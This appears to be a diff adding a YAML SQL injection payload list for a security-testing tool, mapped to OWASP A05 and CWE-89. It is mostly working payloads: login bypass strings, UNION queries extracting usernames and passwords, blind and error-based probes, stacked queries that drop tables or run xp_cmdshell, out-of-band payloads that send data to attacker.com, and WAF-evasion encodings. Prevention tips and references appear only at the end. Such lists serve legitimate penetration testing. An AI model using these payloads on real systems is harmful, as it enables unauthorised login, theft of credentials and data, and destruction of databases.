@@ -1,0 +1,265 @@
+# A05:2025 - Injection - SQL Injection Payloads
+# CWE-89: Improper Neutralization of Special Elements used in an SQL Command
+
+payload_category: "sql-injection"
+owasp_2025: "A05"
+cwe: "CWE-89"
+severity: "CRITICAL"
+
+# ===== AUTHENTICATION BYPASS =====
+auth_bypass:
+  basic:
+    - "' OR '1'='1"
+    - "' OR '1'='1'--"
+    - "' OR '1'='1'#"
+    - "' OR '1'='1'/*"
+    - "admin'--"
+    - "admin'#"
+    - "admin'/*"
+    - "' OR 1=1--"
+    - "' OR 1=1#"
+    - "') OR ('1'='1"
+    - "') OR ('1'='1'--"
+    - "\" OR \"1\"=\"1"
+    - "\" OR \"1\"=\"1\"--"
+
+  username_field:
+    - "admin' OR '1'='1"
+    - "admin' OR '1'='1'--"
+    - "admin' OR 1=1--"
+    - "administrator'--"
+    - "' OR 'x'='x"
+    - "' OR 'a'='a"
+    - "1' OR '1' = '1"
+    - "' OR ''='"
+    - "admin' OR 'a'='a'--"
+
+  password_field:
+    - "' OR '1'='1"
+    - "password' OR 1=1--"
+    - "' OR 'x'='x"
+    - "anything' OR 'x'='x"
+    - "' OR 1=1 LIMIT 1--"
+
+# ===== BASIC DETECTION =====
+basic_detection:
+  single_quote:
+    - "'"
+    - "''"
+    - "'''"
+  
+  numeric:
+    - "1 OR 1=1"
+    - "1 OR 1=1--"
+    - "1 OR 1=1#"
+    - "1' OR '1'='1'--"
+    - "-1 OR 1=1"
+    - "0 OR 1=1"
+
+  double_quote:
+    - "\""
+    - "\" OR \"\"=\""
+    - "\" OR 1=1--"
+
+  comment_probing:
+    - "1--"
+    - "1#"
+    - "1/*"
+    - "1;--"
+
+# ===== UNION-BASED =====
+union_based:
+  column_enumeration:
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+    - "' ORDER BY 1--"
+    - "' ORDER BY 2--"
+    - "' ORDER BY 3--"
+    - "' ORDER BY 5--"
+    - "' ORDER BY 10--"
+    - "' ORDER BY 15--"
+    - "' ORDER BY 20--"
+
+  data_extraction:
+    - "' UNION SELECT username,password FROM users--"
+    - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+    - "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"
+    - "' UNION SELECT @@version,NULL--"
+    - "' UNION SELECT user(),NULL--"
+    - "' UNION SELECT database(),NULL--"
+    - "' UNION SELECT schema_name,NULL FROM information_schema.schemata--"
+    - "' UNION SELECT CONCAT(username,':',password),NULL FROM users--"
+
+  integer_union:
+    - "1 UNION SELECT NULL--"
+    - "1 UNION SELECT NULL,NULL--"
+    - "1 UNION SELECT NULL,NULL,NULL--"
+    - "1 UNION SELECT @@version,NULL,NULL--"
+    - "1 UNION SELECT table_name,NULL FROM information_schema.tables--"
+
+# ===== BOOLEAN-BASED BLIND =====
+boolean_blind:
+  true_conditions:
+    - "' AND 1=1--"
+    - "' AND 'a'='a'--"
+    - "1' AND 1=1--"
+    - "1 AND 1=1"
+
+  false_conditions:
+    - "' AND 1=2--"
+    - "' AND 'a'='b'--"
+    - "1' AND 1=2--"
+    - "1 AND 1=2"
+
+  data_extraction:
+    - "' AND (SELECT COUNT(*) FROM users)>0--"
+    - "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--"
+    - "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"
+    - "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--"
+
+# ===== TIME-BASED BLIND =====
+time_based:
+  mysql:
+    - "' AND SLEEP(3)--"
+    - "1' AND SLEEP(3)--"
+    - "' AND IF(1=1,SLEEP(3),0)--"
+    - "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
+    - "' AND BENCHMARK(5000000,MD5('test'))--"
+    - "1; SELECT SLEEP(3)--"
+
+  postgresql:
+    - "'; SELECT pg_sleep(3)--"
+    - "' AND (SELECT pg_sleep(3))::text IS NOT NULL--"
+    - "1; SELECT pg_sleep(3)--"
+
+  mssql:
+    - "'; WAITFOR DELAY '0:0:3'--"
+    - "1; WAITFOR DELAY '0:0:3'--"
+    - "' AND (SELECT CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:3' END)--"
+
+  oracle:
+    - "' AND dbms_pipe.receive_message('a',3) IS NULL--"
+    - "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--"
+
+  sqlite:
+    - "' AND 1=randomblob(300000000)--"
+
+# ===== ERROR-BASED =====
+error_based:
+  mysql:
+    - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
+    - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--"
+    - "' AND 1=CONVERT(int,(SELECT @@version))--"
+
+  mssql:
+    - "' AND 1=CONVERT(int,@@version)--"
+    - "' AND 1=CONVERT(int,db_name())--"
+    - "' AND 1=CONVERT(int,user_name())--"
+    - "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+
+  postgresql:
+    - "' AND 1=CAST(version() AS int)--"
+    - "' AND 1=CAST(current_database() AS int)--"
+
+# ===== STACKED QUERIES =====
+stacked_queries:
+  - "'; DROP TABLE users--"
+  - "1; DROP TABLE users--"
+  - "'; INSERT INTO users VALUES('hacker','password')--"
+  - "'; UPDATE users SET password='hacked' WHERE username='admin'--"
+  - "1; EXEC xp_cmdshell('whoami')--"
+  - "'; CREATE TABLE hacked(data text)--"
+
+# ===== OUT-OF-BAND =====
+out_of_band:
+  mysql:
+    - "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--"
+  mssql:
+    - "'; DECLARE @q VARCHAR(8000); SET @q='\\\\'+@@version+'.attacker.com\\a'; EXEC master..xp_dirtree @q--"
+  oracle:
+    - "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual--"
+
+# ===== WAF BYPASS =====
+waf_bypass:
+  encoding:
+    url_encoded:
+      - "%27%20OR%20%271%27%3D%271"
+      - "%27%20UNION%20SELECT%20NULL--"
+    double_encoded:
+      - "%2527%2520OR%25201%253D1--"
+    hex:
+      - "0x27204f522027312720273d2731"
+    unicode:
+      - "' %u004f%u0052 1=1--"
+
+  case_variation:
+    - "' uNiOn SeLeCt NULL--"
+    - "' UnIoN sElEcT NULL,NULL--"
+    - "' oR 1=1--"
+
+  comment_obfuscation:
+    - "'/**/OR/**/1=1--"
+    - "' UN/**/ION SE/**/LECT NULL--"
+    - "/*!50000SELECT*/ NULL--"
+    - "' /*!12345UNION*/ /*!12345SELECT*/ NULL--"
+
+  whitespace_bypass:
+    - "'%0aOR%0a1=1--"
+    - "'%09OR%091=1--"
+    - "'%0dOR%0d1=1--"
+    - "' OR\t1=1--"
+
+  string_concatenation:
+    mysql:
+      - "' OR 'ad'+'min'='admin'--"
+      - "' UNION SELECT CONCAT(0x61,0x64,0x6d,0x69,0x6e)--"
+    postgresql:
+      - "' OR 'ad'||'min'='admin'--"
+    oracle:
+      - "' OR 'ad'||'min'='admin'--"
+
+  no_spaces:
+    - "'OR'1'='1"
+    - "'OR(1=1)--"
+    - "'UNION(SELECT(NULL))--"
+
+# ===== SECOND ORDER =====
+second_order:
+  - "admin'-- (register, then trigger via profile update)"
+  - "test' OR '1'='1'-- (store in comment, trigger via search)"
+
+# ===== INJECTION POINTS =====
+injection_points:
+  - "Login forms (username, password)"
+  - "Search fields"
+  - "Sort/Filter parameters (ORDER BY)"
+  - "Pagination (offset, limit, page)"
+  - "User profile fields"
+  - "Cookie values"
+  - "HTTP headers (User-Agent, Referer, X-Forwarded-For)"
+  - "JSON/XML body parameters"
+  - "File upload filenames"
+  - "REST API path parameters (/api/users/{id})"
+
+prevention:
+  - "Use parameterized queries (prepared statements)"
+  - "Use stored procedures with parameterized inputs"
+  - "Input validation with whitelist approach"
+  - "Escape special characters using database-specific functions"
+  - "Principle of least privilege for database accounts"
+  - "Use ORM frameworks properly (avoid raw SQL)"
+  - "Disable detailed error messages in production"
+  - "Web Application Firewall (WAF)"
+  - "Regular security testing and code review"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-89: SQL Injection"
+  - "OWASP SQL Injection Prevention Cheat Sheet"
+  - "PayloadsAllTheThings: SQL Injection"
+  - "PortSwigger SQL Injection Cheat Sheet"
